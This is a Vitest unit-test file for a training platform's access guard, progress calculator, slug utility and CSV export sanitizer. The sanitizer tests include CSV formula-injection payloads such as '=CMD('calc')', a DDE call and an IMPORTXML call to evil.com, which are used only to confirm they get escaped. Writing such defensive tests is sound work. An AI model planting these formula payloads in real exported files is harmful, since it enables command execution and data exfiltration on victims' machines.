import { describe, it, expect } from "vitest";
import {
  canUserAccessProgramme,
  calculateProgrammeProgress,
  slugify,
} from "@/lib/training/training";
import { sanitizeCsvValue } from "@/lib/training/csv";
import { LearnerGroup, Role } from "@prisma/client";

describe("Phase 7: Training Engine Unit Tests", () => {
  describe("1. Confidentiality & Clearance Guard (canUserAccessProgramme)", () => {
    it("allows ADMIN full access to any restricted programme", () => {
      const allowed = canUserAccessProgramme(
        { role: Role.ADMIN, learnerGroup: null },
        { isRestricted: true, targetGroup: LearnerGroup.NAVAL_OFFICER }
      );
      expect(allowed).toBe(true);
    });

    it("allows NAVAL_OFFICER access to restricted naval programme", () => {
      const allowed = canUserAccessProgramme(
        { role: Role.LEARNER, learnerGroup: LearnerGroup.NAVAL_OFFICER },
        { isRestricted: true, targetGroup: LearnerGroup.NAVAL_OFFICER }
      );
      expect(allowed).toBe(true);
    });

    it("STRICTLY DENIES civilian FPO learner access to restricted programme", () => {
      const allowed = canUserAccessProgramme(
        { role: Role.LEARNER, learnerGroup: LearnerGroup.FPO },
        { isRestricted: true, targetGroup: LearnerGroup.NAVAL_OFFICER }
      );
      expect(allowed).toBe(false);
    });

    it("STRICTLY DENIES civilian FPC learner access to restricted programme", () => {
      const allowed = canUserAccessProgramme(
        { role: Role.LEARNER, learnerGroup: LearnerGroup.FPC },
        { isRestricted: true, targetGroup: LearnerGroup.NAVAL_OFFICER }
      );
      expect(allowed).toBe(false);
    });

    it("STRICTLY DENIES general STUDENT learner access to restricted programme", () => {
      const allowed = canUserAccessProgramme(
        { role: Role.LEARNER, learnerGroup: LearnerGroup.STUDENT },
        { isRestricted: true, targetGroup: LearnerGroup.NAVAL_OFFICER }
      );
      expect(allowed).toBe(false);
    });

    it("allows civilian learners access to non-restricted public programmes", () => {
      const allowedFpo = canUserAccessProgramme(
        { role: Role.LEARNER, learnerGroup: LearnerGroup.FPO },
        { isRestricted: false, targetGroup: LearnerGroup.FPO }
      );
      const allowedFpc = canUserAccessProgramme(
        { role: Role.LEARNER, learnerGroup: LearnerGroup.FPC },
        { isRestricted: false, targetGroup: LearnerGroup.FPC }
      );
      expect(allowedFpo).toBe(true);
      expect(allowedFpc).toBe(true);
    });
  });

  describe("2. Programme Progress & Completion Calculator", () => {
    const mockProgrammeCourses = [
      {
        courseId: "course-1",
        isRequired: true,
        sortOrder: 1,
        course: { id: "course-1", title: "Getting Started", slug: "getting-started" },
      },
      {
        courseId: "course-2",
        isRequired: true,
        sortOrder: 2,
        course: { id: "course-2", title: "FPO Governance", slug: "fpo-governance" },
      },
      {
        courseId: "course-3",
        isRequired: false,
        sortOrder: 3,
        course: { id: "course-3", title: "Elective Module", slug: "elective-mod" },
      },
    ];

    it("calculates 0% when learner has no enrollments", () => {
      const result = calculateProgrammeProgress(mockProgrammeCourses, []);
      expect(result.overallProgressPct).toBe(0);
      expect(result.completedCoursesCount).toBe(0);
      expect(result.isCompleted).toBe(false);
      expect(result.totalRequiredCourses).toBe(2);
    });

    it("calculates partial progress across courses", () => {
      const enrollments = [
        {
          courseId: "course-1",
          progressPct: 100,
          isCompleted: true,
          assessmentStatus: "PASSED",
        },
        {
          courseId: "course-2",
          progressPct: 50,
          isCompleted: false,
          assessmentStatus: "IN_PROGRESS",
        },
      ];

      const result = calculateProgrammeProgress(mockProgrammeCourses, enrollments);
      // (100 + 50 + 0) / 3 = 50%
      expect(result.overallProgressPct).toBe(50);
      expect(result.completedCoursesCount).toBe(1);
      expect(result.completedRequiredCount).toBe(1);
      expect(result.isCompleted).toBe(false);
    });

    it("marks programme completed when ALL required courses are completed, even if optional is incomplete", () => {
      const enrollments = [
        {
          courseId: "course-1",
          progressPct: 100,
          isCompleted: true,
          assessmentStatus: "PASSED",
        },
        {
          courseId: "course-2",
          progressPct: 100,
          isCompleted: true,
          assessmentStatus: "PASSED",
        },
      ];

      const result = calculateProgrammeProgress(mockProgrammeCourses, enrollments);
      expect(result.completedRequiredCount).toBe(2);
      expect(result.allRequiredPassed).toBe(true);
      expect(result.isCompleted).toBe(true);
    });
  });

  describe("3. CWE-1236 Formula Injection Sanitizer (sanitizeCsvValue)", () => {
    it("escapes formula injection prefixes with single quote", () => {
      expect(sanitizeCsvValue("=CMD('calc')")).toBe(`"'=CMD('calc')\"`);
      expect(sanitizeCsvValue("+12345")).toBe(`"'+12345\"`);
      expect(sanitizeCsvValue("-SUM(A1:A10)")).toBe(`"'-SUM(A1:A10)\"`);
      expect(sanitizeCsvValue("@IMPORTXML('http://evil.com')")).toBe(
        `"'@IMPORTXML('http://evil.com')\"`
      );
      expect(sanitizeCsvValue("\t=DDE()")).toBe(`"'\t=DDE()\"`);
    });

    it("leaves regular alphanumeric text unescaped by leading quote", () => {
      expect(sanitizeCsvValue("Learn LMS Training")).toBe(`"Learn LMS Training"`);
      expect(sanitizeCsvValue("FPO Member Training")).toBe(`"FPO Member Training"`);
      expect(sanitizeCsvValue(100)).toBe(`"100"`);
      expect(sanitizeCsvValue(null)).toBe('""');
      expect(sanitizeCsvValue(undefined)).toBe('""');
    });

    it("properly escapes inner double quotes", () => {
      expect(sanitizeCsvValue('Title with "Quotes"')).toBe(`"Title with ""Quotes"""`);
    });
  });

  describe("4. Slug Generation Utility", () => {
    it("creates sanitized url-friendly slugs", () => {
      expect(slugify("Using the Main Application — FPO Members")).toBe(
        "using-the-main-application-fpo-members"
      );
      expect(slugify("Learn LMS Platform Orientation: Naval Officers!")).toBe(
        "learn-lms-platform-orientation-naval-officers"
      );
    });
  });
});
